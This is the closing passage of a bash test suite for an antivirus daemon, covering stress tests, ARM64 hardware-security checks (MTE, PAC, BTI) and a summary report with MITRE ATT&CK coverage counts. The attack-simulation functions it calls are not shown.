        local cpu_after=$(ps -o %cpu= -p "$(pgrep -x av-daemon | head -1)" 2>/dev/null | tr -d ' ' || echo "0")
        cpu_after=${cpu_after%.*}; cpu_after=${cpu_after:-0}
        [ "$cpu_after" -lt 50 ] && record_test "performance" "CPU under load (${cpu_after}%)" "PASS" || record_test "performance" "CPU under load (${cpu_after}%)" "WARN" "High CPU usage"
        rm -rf "$perf_dir/load"
    fi
}

test_stress() {
    if [ "$MODE" = "--quick" ]; then record_test "stress" "Stress tests" "SKIP" "Use --full mode"; return; fi
    section "Phase 8: Stress Tests"
    local stress_dir="$TEST_DIR/stress"; mkdir -p "$stress_dir"
    info "Creating 10,000 files..."; local start=$(date +%s%3N); for i in $(seq 1 10000); do echo "stress test $RANDOM" > "$stress_dir/stress_$i.txt"; done
    local duration=$(($(date +%s%3N) - start)); local rate=$((10000000 / duration)); record_test "stress" "10K file creation ($rate files/sec)" "PASS" "" "$duration"

    info "Running 10 concurrent file generators..."; start=$(date +%s%3N)
    for j in $(seq 1 10); do ( for i in $(seq 1 100); do echo "concurrent $j $i $RANDOM" > "$stress_dir/concurrent_${j}_${i}.txt"; done ) & done; wait
    duration=$(($(date +%s%3N) - start)); record_test "stress" "Concurrent file operations" "PASS" "10 threads × 100 files" "$duration"

    info "Creating 100MB file..."; start=$(date +%s%3N); dd if=/dev/urandom of="$stress_dir/large.bin" bs=1M count=100 2>/dev/null
    duration=$(($(date +%s%3N) - start)); record_test "stress" "100MB file creation" "PASS" "" "$duration"
    if [ -f "$CLI_BIN" ]; then info "Scanning 100MB file..."; start=$(date +%s%3N); "$CLI_BIN" scan "$stress_dir/large.bin" >/dev/null 2>&1 || true; duration=$(($(date +%s%3N) - start)); record_test "stress" "100MB file scan" "PASS" "" "$duration"; fi
    rm -f "$stress_dir/large.bin"

    info "Spawning 2000 processes..."; start=$(date +%s%3N); for i in $(seq 1 2000); do /bin/true; done
    duration=$(($(date +%s%3N) - start)); rate=$((2000000 / duration)); record_test "stress" "2K process spawn ($rate procs/sec)" "PASS" "" "$duration"

    info "Running mixed workload (files + processes + network)..."; start=$(date +%s%3N)
    (for i in $(seq 1 500); do echo "bg $i" > "$stress_dir/bg_$i.txt"; done) &
    (for i in $(seq 1 500); do /bin/true; done) &
    if command -v curl &>/dev/null; then (for i in $(seq 1 10); do curl -s --max-time 1 http://example.com >/dev/null 2>&1 || true; done) & fi
    wait; duration=$(($(date +%s%3N) - start)); record_test "stress" "Mixed workload" "PASS" "" "$duration"
    rm -rf "$stress_dir"
}

test_arm64_hardware() {
    if [ "$(uname -m)" != "aarch64" ]; then record_test "arm64" "ARM64 hardware tests" "SKIP" "Not running on ARM64"; return; fi
    section "Phase 9: ARM64 Hardware Security"
    subsection "CPU Feature Detection"
    if grep -q "mte" /proc/cpuinfo 2>/dev/null; then record_test "arm64" "MTE Support" "PASS" "Hardware supported"; [ -f "/proc/sys/abi/mte" ] && record_test "arm64" "MTE Kernel Support" "PASS" || record_test "arm64" "MTE Kernel Support" "WARN" "Kernel not configured for MTE"; else record_test "arm64" "MTE Support" "SKIP" "CPU does not support MTE"; fi
    grep -qE "paca|pacg" /proc/cpuinfo 2>/dev/null && record_test "arm64" "PAC Support" "PASS" "Hardware supported" || record_test "arm64" "PAC Support" "SKIP" "CPU does not support PAC"
    grep -q "bti" /proc/cpuinfo 2>/dev/null && record_test "arm64" "BTI Support" "PASS" "Hardware supported" || record_test "arm64" "BTI Support" "SKIP" "CPU does not support BTI"
    grep -q "sve" /proc/cpuinfo 2>/dev/null && record_test "arm64" "SVE Support" "PASS" "Vector extensions available"

    subsection "Binary Security Features"
    if [ -f "$DAEMON_BIN" ]; then
        objdump -d "$DAEMON_BIN" 2>/dev/null | grep -qE "paciasp|autiasp|pacia|autia" && record_test "arm64" "PAC Instructions in Binary" "PASS" || record_test "arm64" "PAC Instructions in Binary" "WARN" "No PAC instructions found"
        objdump -d "$DAEMON_BIN" 2>/dev/null | grep -q "bti" && record_test "arm64" "BTI Instructions in Binary" "PASS" || record_test "arm64" "BTI Instructions in Binary" "WARN" "No BTI instructions found"
    fi
}

generate_report() {
    local end_time=$(date +%s); local total_duration=$((end_time - START_TIME))
    banner "Test Results Summary"
    local testable=$((TOTAL_TESTS - TESTS_SKIPPED)); local pass_rate=0; [ "$testable" -gt 0 ] && pass_rate=$((TESTS_PASSED * 100 / testable))
    echo "┌─────────────────────────────────────────┐"
    echo "│ Results                                 │"
    echo "├─────────────────────────────────────────┤"
    printf "│ ${GREEN}Passed${NC}:  %-30s │\n" "$TESTS_PASSED"
    printf "│ ${RED}Failed${NC}:  %-30s │\n" "$TESTS_FAILED"
    printf "│ ${YELLOW}Warning${NC}: %-30s │\n" "$TESTS_WARNING"
    printf "│ ${GRAY}Skipped${NC}: %-30s │\n" "$TESTS_SKIPPED"
    echo "├─────────────────────────────────────────┤"
    printf "│ Total:   %-30s │\n" "$TOTAL_TESTS"
    printf "│ Pass Rate: %-28s │\n" "${pass_rate}%"
    printf "│ Duration: %-29s │\n" "${total_duration}s"
    echo "└─────────────────────────────────────────┘"
    echo

    echo "Category Breakdown:"
    echo "───────────────────────────────────────────"
    for category in "${!CATEGORY_TOTAL[@]}"; do
        local cat_passed=${CATEGORY_PASSED[$category]:-0}; local cat_total=${CATEGORY_TOTAL[$category]:-0}
        printf "  %-15s %d/%d passed\n" "$category:" "$cat_passed" "$cat_total"
    done
    echo

    echo "MITRE ATT&CK Coverage:"
    echo "───────────────────────────────────────────"
    local mitre_tested=${CATEGORY_TOTAL[mitre]:-0}; local mitre_detected=${CATEGORY_PASSED[mitre]:-0}
    echo "  Techniques Tested: $mitre_tested"; echo "  Techniques Detected: $mitre_detected"
    [ "$mitre_tested" -gt 0 ] && echo "  Detection Rate: $((mitre_detected * 100 / mitre_tested))%"
    echo

    cat > "$RESULTS_DIR/summary.json" << EOF
{
    "suite": "WinnCore Ultimate Test",
    "version": "$VERSION",
    "completed": "$(date -Iseconds)",
    "duration_seconds": $total_duration,
    "results": {
        "total": $TOTAL_TESTS,
        "passed": $TESTS_PASSED,
        "failed": $TESTS_FAILED,
        "warning": $TESTS_WARNING,
        "skipped": $TESTS_SKIPPED,
        "pass_rate": $pass_rate
    },
    "environment": {
        "kernel": "$(uname -r)",
        "arch": "$(uname -m)",
        "daemon_running": ${DAEMON_RUNNING:-false},
        "is_root": ${IS_ROOT:-false}
    }
}
EOF
    info "Detailed results saved to: $RESULTS_DIR/"
    echo
    if [ "$TESTS_FAILED" -eq 0 ]; then echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"; echo -e "${GREEN}║                     ALL TESTS PASSED!                         ║${NC}"; echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    elif [ "$TESTS_FAILED" -lt 5 ]; then echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════════╗${NC}"; echo -e "${YELLOW}║              MOSTLY PASSING ($TESTS_FAILED failures)          ║${NC}"; echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════╝${NC}"
    else echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"; echo -e "${RED}║              $TESTS_FAILED TESTS FAILED                       ║${NC}"; echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"; fi
}

main() {
    MODE="${1:---full}"
    setup
    case "$MODE" in
        --quick) test_build; test_hardening; test_detection ;;
        --attacks-only) test_mitre_attacks; test_advanced_evasion ;;
        --performance) test_performance; test_stress ;;
        --full|*) test_build; test_hardening; test_detection; test_mitre_attacks; test_advanced_evasion; test_deception; test_performance; test_stress; test_arm64_hardware ;;
    esac
    generate_report
}

main "$@"
